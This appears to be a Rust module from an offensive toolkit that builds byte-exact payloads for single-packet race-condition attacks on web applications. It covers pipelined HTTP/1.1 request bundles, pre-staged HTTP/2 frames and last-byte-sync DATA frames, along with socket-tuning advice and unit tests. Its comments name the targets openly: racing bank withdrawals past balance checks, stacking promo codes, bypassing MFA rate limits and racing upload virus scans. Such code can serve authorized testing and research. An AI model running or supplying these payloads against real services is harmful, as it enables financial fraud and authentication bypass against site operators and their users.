//! Single-packet race-condition primitives.
//!
//! Race conditions in web applications usually require the attacker
//! to fire N parallel requests so close in time that they all reach
//! the application's logic check before any of them commits. The
//! limit is no longer "how fast can I send" — it's "how synchronized
//! can my requests be when they hit the server's TCP layer."
//!
//! James Kettle's Black Hat 2023 "Smashing the State Machine" research
//! introduced the **single-packet attack**: pack the LAST byte of N
//! HTTP/2 requests (or N parallel HTTP/1.1 pipelined requests) into
//! one IP packet. The kernel delivers all N at once; they cross the
//! application's race window in nanoseconds rather than milliseconds.
//!
//! This module builds the WIRE BYTES for the attack. The actual
//! "send everything in one TCP packet" trick is a transport-layer
//! concern: the operator must disable Nagle (`TCP_NODELAY` off — yes
//! OFF, so Nagle batches the writes), keep the connection open with
//! HTTP/2, and use `MSG_MORE`-style writev to coalesce.
//!
//! Two attack shapes:
//!
//! - **HTTP/2 last-byte-sync**. Send N concurrent streams, each
//!   stalled with the body almost-but-not-quite complete. Then send
//!   ONE final-byte frame per stream in a single packet. Server
//!   wakes all N handlers in the same epoch.
//! - **HTTP/1.1 pipelined coalesce**. Send N pipelined requests
//!   back-to-back on one connection, with Nagle off and large MSS.
//!   Less reliable than H2 but works against legacy origins.
//!
//! Use cases:
//!
//! - **Authorization race**: hit "withdraw $100" N times before the
//!   balance-check fires once.
//! - **Coupon stacking**: apply the same promo code N times.
//! - **MFA bypass**: submit OTP guesses faster than the rate-limit
//!   window opens.
//! - **TOCTOU file uploads**: race between virus-scan and storage.

/// Build the byte-for-byte HTTP/1.1 pipelined coalesce payload for N
/// identical requests.
///
/// Each request is rendered as a complete HTTP/1.1 message. The
/// returned `Vec<u8>` is the concatenation of all N. Operator sends
/// this to the socket in one `write` call after setting `TCP_NODELAY`
/// off (so Nagle batches the writes).
///
/// `method`, `path`, `host`, `extra_headers`, `body` are the fields
/// of one request. They're replayed identically N times.
#[must_use]
pub fn pipelined_h1_coalesce(
    n: usize,
    method: &str,
    path: &str,
    host: &str,
    extra_headers: &[(&str, &str)],
    body: &[u8],
) -> Vec<u8> {
    let mut req = format!("{method} {path} HTTP/1.1\r\nHost: {host}\r\n");
    for (k, v) in extra_headers {
        req.push_str(&format!("{k}: {v}\r\n"));
    }
    if !body.is_empty() {
        req.push_str(&format!("Content-Length: {}\r\n", body.len()));
    } else {
        req.push_str("Content-Length: 0\r\n");
    }
    req.push_str("Connection: keep-alive\r\n\r\n");

    let mut out = Vec::with_capacity((req.len() + body.len()) * n);
    for _ in 0..n {
        out.extend_from_slice(req.as_bytes());
        out.extend_from_slice(body);
    }
    out
}

/// Build the N partial-bodies for the HTTP/2 last-byte-sync attack.
///
/// Per Kettle 2023:
/// 1. Open one HTTP/2 connection.
/// 2. For each of the N target streams, send the request frames + ALL
///    body bytes EXCEPT the last byte. The server now has N stalled
///    streams.
/// 3. Send one packet containing the final-byte DATA frame for every
///    stream. The kernel delivers all N final bytes in the same epoch.
///
/// This function builds STEP 3's payload: `n` final-byte DATA frames,
/// each one byte of payload, all in the same buffer.
///
/// `stream_ids` is the list of stream IDs the operator pre-allocated
/// in step 2. `final_bytes` is one byte per stream — the byte that
/// completes each request body.
///
/// Returns `None` if `stream_ids.len() != final_bytes.len()` or if
/// any stream id is even (per RFC 7540 §5.1.1 client streams must be
/// odd).
#[must_use]
pub fn h2_last_byte_sync_frames(
    stream_ids: &[u32],
    final_bytes: &[u8],
) -> Option<Vec<u8>> {
    if stream_ids.len() != final_bytes.len() {
        return None;
    }
    for &id in stream_ids {
        if id == 0 || id % 2 == 0 {
            // Client-initiated streams MUST be odd and non-zero per
            // RFC 7540 §5.1.1.
            return None;
        }
    }

    // Each DATA frame layout (RFC 7540 §6.1):
    //   Length: 24 bits big-endian (1 byte of payload → 0x000001)
    //   Type:    8 bits — 0x00 for DATA
    //   Flags:   8 bits — 0x01 END_STREAM
    //   Stream:  32 bits — high bit reserved, then 31-bit stream id
    //   Payload: <Length> bytes — the final byte.
    let mut out = Vec::with_capacity(stream_ids.len() * 10);
    for (id, byte) in stream_ids.iter().zip(final_bytes.iter()) {
        // Length = 1 (24-bit big-endian).
        out.extend_from_slice(&[0x00, 0x00, 0x01]);
        // Type DATA.
        out.push(0x00);
        // Flags: END_STREAM.
        out.push(0x01);
        // Stream id (clear the reserved high bit).
        out.extend_from_slice(&(id & 0x7FFF_FFFF).to_be_bytes());
        // Payload.
        out.push(*byte);
    }
    Some(out)
}

/// Build the N pre-final-byte HTTP/2 frame sequences for step 2 of
/// the last-byte-sync attack.
///
/// For each stream, this emits:
///   - HEADERS frame (END_HEADERS, NOT END_STREAM) for the request line
///   - DATA frame carrying body_len-1 bytes of the body (NOT END_STREAM)
///
/// The body is intentionally short by ONE byte. The operator then
/// fires `h2_last_byte_sync_frames` once to complete every stream
/// atomically.
///
/// HEADERS payload is operator-supplied (HPACK-encoded — this module
/// doesn't carry an HPACK encoder; use `hpack` crate at the call site).
#[must_use]
pub fn h2_prestaged_frames(
    stream_id: u32,
    hpack_encoded_headers: &[u8],
    body_without_last_byte: &[u8],
) -> Option<Vec<u8>> {
    if stream_id == 0 || stream_id.is_multiple_of(2) {
        return None;
    }
    let mut out = Vec::new();

    // HEADERS frame: length, type 0x01, flags END_HEADERS (0x04, NOT
    // END_STREAM), stream id, payload.
    let hlen = hpack_encoded_headers.len();
    if hlen > 0xFF_FFFF {
        return None;
    }
    out.extend_from_slice(&[(hlen >> 16) as u8, (hlen >> 8) as u8, hlen as u8]);
    out.push(0x01); // HEADERS
    out.push(0x04); // END_HEADERS only
    out.extend_from_slice(&(stream_id & 0x7FFF_FFFF).to_be_bytes());
    out.extend_from_slice(hpack_encoded_headers);

    // DATA frame for the body MINUS the last byte. Flags = 0 (no
    // END_STREAM — that's what the final-byte frame will carry).
    if !body_without_last_byte.is_empty() {
        let blen = body_without_last_byte.len();
        if blen > 0xFF_FFFF {
            return None;
        }
        out.extend_from_slice(&[(blen >> 16) as u8, (blen >> 8) as u8, blen as u8]);
        out.push(0x00); // DATA
        out.push(0x00); // no flags
        out.extend_from_slice(&(stream_id & 0x7FFF_FFFF).to_be_bytes());
        out.extend_from_slice(body_without_last_byte);
    }

    Some(out)
}

/// Recommended socket-level settings for the single-packet attack.
/// Operators set these on their sender's TCP socket before issuing
/// the payload from `pipelined_h1_coalesce` / `h2_last_byte_sync_frames`.
pub const RECOMMENDED_SOCKET_SETTINGS: &[&str] = &[
    "TCP_NODELAY: OFF — allow Nagle to batch the writes into one segment",
    "SO_SNDBUF: ≥ 65536 — large enough to hold every byte before flush",
    "MSS: default (1460 over Ethernet) — coalesces ≥10 small requests",
    "TCP_QUICKACK: OFF — defer ACKs",
    "TLS_RECORD_SIZE_LIMIT: 16384 — fits ≥30 typical requests in one record",
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pipelined_h1_concatenates_n_copies() {
        let payload = pipelined_h1_coalesce(
            3,
            "POST",
            "/withdraw",
            "bank.example",
            &[("Authorization", "Bearer abc")],
            b"amount=100",
        );
        let s = String::from_utf8_lossy(&payload);
        assert_eq!(s.matches("POST /withdraw HTTP/1.1").count(), 3);
        assert_eq!(s.matches("amount=100").count(), 3);
    }

    #[test]
    fn pipelined_h1_sets_content_length() {
        let payload = pipelined_h1_coalesce(1, "POST", "/x", "h", &[], b"hello");
        let s = String::from_utf8_lossy(&payload);
        assert!(s.contains("Content-Length: 5"));
    }

    #[test]
    fn pipelined_h1_empty_body_zero_length() {
        let payload = pipelined_h1_coalesce(1, "GET", "/x", "h", &[], b"");
        let s = String::from_utf8_lossy(&payload);
        assert!(s.contains("Content-Length: 0"));
    }

    #[test]
    fn pipelined_h1_keep_alive_set() {
        let payload = pipelined_h1_coalesce(1, "GET", "/x", "h", &[], b"");
        let s = String::from_utf8_lossy(&payload);
        assert!(s.contains("Connection: keep-alive"));
    }

    #[test]
    fn pipelined_h1_zero_copies_empty_output() {
        let payload = pipelined_h1_coalesce(0, "GET", "/x", "h", &[], b"");
        assert!(payload.is_empty());
    }

    #[test]
    fn pipelined_h1_includes_extra_headers() {
        let payload = pipelined_h1_coalesce(
            1,
            "GET",
            "/x",
            "h",
            &[("X-Custom", "yes"), ("X-Trace", "abc")],
            b"",
        );
        let s = String::from_utf8_lossy(&payload);
        assert!(s.contains("X-Custom: yes"));
        assert!(s.contains("X-Trace: abc"));
    }

    #[test]
    fn h2_last_byte_sync_rejects_mismatched_lengths() {
        let r = h2_last_byte_sync_frames(&[1, 3], b"a");
        assert!(r.is_none());
    }

    #[test]
    fn h2_last_byte_sync_rejects_zero_stream() {
        let r = h2_last_byte_sync_frames(&[0], b"a");
        assert!(r.is_none());
    }

    #[test]
    fn h2_last_byte_sync_rejects_even_stream() {
        let r = h2_last_byte_sync_frames(&[2], b"a");
        assert!(r.is_none());
    }

    #[test]
    fn h2_last_byte_sync_basic_frame_shape() {
        let bytes = h2_last_byte_sync_frames(&[1], b"X").expect("ok");
        // 9-byte header + 1-byte payload = 10 bytes.
        assert_eq!(bytes.len(), 10);
        // Length = 1.
        assert_eq!(&bytes[0..3], &[0x00, 0x00, 0x01]);
        // Type DATA.
        assert_eq!(bytes[3], 0x00);
        // Flags END_STREAM.
        assert_eq!(bytes[4], 0x01);
        // Stream id 1.
        assert_eq!(&bytes[5..9], &[0x00, 0x00, 0x00, 0x01]);
        // Payload.
        assert_eq!(bytes[9], b'X');
    }

    #[test]
    fn h2_last_byte_sync_multiple_streams() {
        let bytes = h2_last_byte_sync_frames(&[1, 3, 5, 7, 9], b"ABCDE").expect("ok");
        // 5 frames × 10 bytes each.
        assert_eq!(bytes.len(), 50);
        // Stream IDs in order.
        for (i, expected_id) in [1u32, 3, 5, 7, 9].iter().enumerate() {
            let offset = i * 10 + 5;
            let id = u32::from_be_bytes([
                bytes[offset],
                bytes[offset + 1],
                bytes[offset + 2],
                bytes[offset + 3],
            ]);
            assert_eq!(id, *expected_id);
        }
    }

    #[test]
    fn h2_last_byte_sync_clears_reserved_bit() {
        // Stream id with the high bit set should have it cleared by
        // the encoder.
        let bytes = h2_last_byte_sync_frames(&[0x80_00_00_01], b"x").expect("ok");
        let id = u32::from_be_bytes([bytes[5], bytes[6], bytes[7], bytes[8]]);
        assert_eq!(id & 0x8000_0000, 0, "high bit must be cleared");
        assert_eq!(id, 1, "low bits preserved");
    }

    #[test]
    fn h2_prestaged_rejects_zero_stream() {
        let r = h2_prestaged_frames(0, &[0x01], &[0x02]);
        assert!(r.is_none());
    }

    #[test]
    fn h2_prestaged_emits_headers_then_data() {
        let hpack = vec![0x82]; // HPACK static-table index 2 — `:method GET`
        let body_short = b"hello"; // 5 bytes
        let bytes = h2_prestaged_frames(1, &hpack, body_short).expect("ok");
        // HEADERS frame: 9-byte header + 1-byte payload = 10.
        // DATA frame: 9-byte header + 5-byte body = 14.
        // Total = 24.
        assert_eq!(bytes.len(), 24);
        // HEADERS type at offset 3.
        assert_eq!(bytes[3], 0x01);
        // HEADERS flags END_HEADERS only.
        assert_eq!(bytes[4], 0x04);
        // DATA type at offset 10 + 3 = 13.
        assert_eq!(bytes[13], 0x00);
        // DATA flags 0 (no END_STREAM).
        assert_eq!(bytes[14], 0x00);
    }

    #[test]
    fn h2_prestaged_empty_body_emits_only_headers() {
        let hpack = vec![0x82];
        let bytes = h2_prestaged_frames(1, &hpack, b"").expect("ok");
        // Only HEADERS frame: 9 + 1 = 10.
        assert_eq!(bytes.len(), 10);
    }

    #[test]
    fn h2_prestaged_rejects_oversized_headers() {
        // 2^24 bytes — exceeds 24-bit length field.
        let huge = vec![0u8; 16_777_216];
        let r = h2_prestaged_frames(1, &huge, &[]);
        assert!(r.is_none());
    }

    #[test]
    fn socket_settings_documented() {
        assert!(!RECOMMENDED_SOCKET_SETTINGS.is_empty());
        assert!(
            RECOMMENDED_SOCKET_SETTINGS
                .iter()
                .any(|s| s.contains("TCP_NODELAY"))
        );
        assert!(
            RECOMMENDED_SOCKET_SETTINGS
                .iter()
                .any(|s| s.contains("Nagle"))
        );
    }

    #[test]
    fn h2_last_byte_sync_deterministic() {
        let a = h2_last_byte_sync_frames(&[1, 3], b"ab").expect("ok");
        let b = h2_last_byte_sync_frames(&[1, 3], b"ab").expect("ok");
        assert_eq!(a, b);
    }

    #[test]
    fn pipelined_h1_deterministic() {
        let a = pipelined_h1_coalesce(5, "GET", "/x", "h", &[], b"y");
        let b = pipelined_h1_coalesce(5, "GET", "/x", "h", &[], b"y");
        assert_eq!(a, b);
    }

    #[test]
    fn adversarial_large_n_no_panic() {
        let _ = pipelined_h1_coalesce(10_000, "GET", "/", "h", &[], b"");
    }

    #[test]
    fn adversarial_many_streams_no_panic() {
        let ids: Vec<u32> = (1..=10_001).step_by(2).take(5_000).collect();
        let bytes_payload: Vec<u8> = ids.iter().map(|_| b'X').collect();
        let r = h2_last_byte_sync_frames(&ids, &bytes_payload).expect("ok");
        assert_eq!(r.len(), 5_000 * 10);
    }
}
